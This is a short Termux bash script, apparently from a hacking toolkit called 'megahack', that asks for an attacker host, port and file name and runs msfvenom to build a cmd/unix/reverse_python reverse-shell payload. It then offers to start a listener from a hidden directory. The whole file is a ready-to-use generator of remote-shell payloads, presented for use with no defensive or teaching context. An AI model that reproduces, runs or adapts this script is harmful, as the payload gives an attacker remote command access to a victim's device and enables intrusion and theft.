#!/data/data/com.termux/files/usr/bin/bash
clear
figlet  Python | lolcat -t
figlet  PAYLOAD | lolcat -t
figlet GENERATOR | lolcat -t
echo " "
tput setaf 1; echo " LHOST "
read lhost
tput setaf 2; echo " LPORT "
read lport
tput setaf 3; echo "OUTPUT PATH"
read out
msfvenom -p cmd/unix/reverse_python lhost="$lhost" lport="$lport" -f raw > $HOME/megahack/python/"$out".py && tput setaf 4; echo " PAYLOAD GENERATED SUCCESSFULLY"
tput setaf 5; echo "START LISTNER NOW n/y"
read nul
if [ "y" = "$nul" ]
then
	cd $HOME/megahack/.l/.python && bash .1.sh
else
	cd $HOME/megahack && bash megahack
fi
